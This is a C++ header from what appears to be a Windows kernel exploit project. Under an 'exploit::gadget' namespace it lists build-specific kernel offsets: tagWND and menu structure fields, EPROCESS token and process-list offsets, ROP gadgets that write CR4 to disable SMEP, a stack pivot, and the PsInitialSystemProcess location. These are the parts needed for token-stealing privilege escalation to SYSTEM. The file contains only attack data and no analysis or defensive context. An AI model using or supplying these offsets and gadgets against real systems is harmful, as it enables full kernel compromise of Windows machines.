#pragma once

namespace exploit
{
    namespace gadget
    {
        namespace X_17763_737
        {
            namespace tagWND
            {
                namespace tagWNDK
                {
                    constexpr size_t tagWNDK = 0x28;

                    constexpr size_t HWND = 0x00;
                    constexpr size_t KernelDesktopHeapBaseOffset = 0x08;
                    constexpr size_t dwStyle = 0x18;
                    constexpr size_t WndRectLeft = 0x58;
                    constexpr size_t WndRectRight = 0x5C;
                    constexpr size_t spMenu = 0x98;
                    constexpr size_t cbWndExtra = 0xC8;
                    constexpr size_t dwExtraFlag = 0xE8;
                    constexpr size_t pExtraByte = 0x128;

                } // namespace tagWNDK
                namespace spMenu {
                    constexpr size_t tagWNDK = 0x90;
                    constexpr size_t hMenu = 0x00;
                    constexpr size_t unknown0 = 0x18;
                    namespace Unknown0 {
                        constexpr size_t unknown00 = 0x100;
                        namespace Unknown00 {
                            constexpr size_t eprocess = 0x00;
                        }//unknown00
                    }//unknown0
                }// namespace spMenu
            } // namespace tagWND

            namespace EPROCESS
            {
                constexpr size_t UniqueProcessId = 0x2E0;
                constexpr size_t ActiveProcessLinks = 0x2E8;
                constexpr size_t ImageFileName = 0x450;
                constexpr size_t Token = 0x358;
            } // namespace EPROCESS
        }

        namespace X_19045_2006
        {
            constexpr size_t pop_rcx_ret = 0x20C64C;
            constexpr size_t mov_cr4_rcx_ret = 0x39EB47;
            constexpr size_t mov_cr4_rax_ret = 0xA18523;
            constexpr size_t bypassSMEPVal = 0x250ef8;
            constexpr size_t mov_esp_add_ret = 0x2996f0; //mov esp, 0x48000000; add esp, 0x28; ret;

            constexpr size_t offsetTokenEproc = 0x4b8;


        } // namespace X_19045

        namespace X_22621_1105
        {
            constexpr size_t systemEprocessAddrOffset = 0xD1DA20;   // *(nt+systemEprocessAddrOffset) = EPROCESS_ADDR
            constexpr size_t tokenToEporcessOffset = 0x4b8;         // EPROCESS_ADDR + tokenToEporcessOffset = TokenVal
        } // namespace X_22621_1105

        namespace X_26200_4946
        {
            constexpr size_t CmpLayerVersions = 0xEF6B60;
            constexpr size_t CmpLayerVersionCount = 0xEF6BE0;
            constexpr size_t PsInitialSystemProcess = 0xFC5AA8;
            namespace EPROCESS
            {

                constexpr size_t UniqueProcessId = 0x1D0;
                constexpr size_t ActiveProcessLinks = 0x1D8;
                constexpr size_t ImageFileName = 0x338;
                constexpr size_t Token = 0x248;
            } // namespace EPROCESS
            constexpr size_t _SEP_TOKEN_PRIVILEGES = 0x40;

        } // namespace X_26200_4946

    } // namespace gadget

} // namespace exploit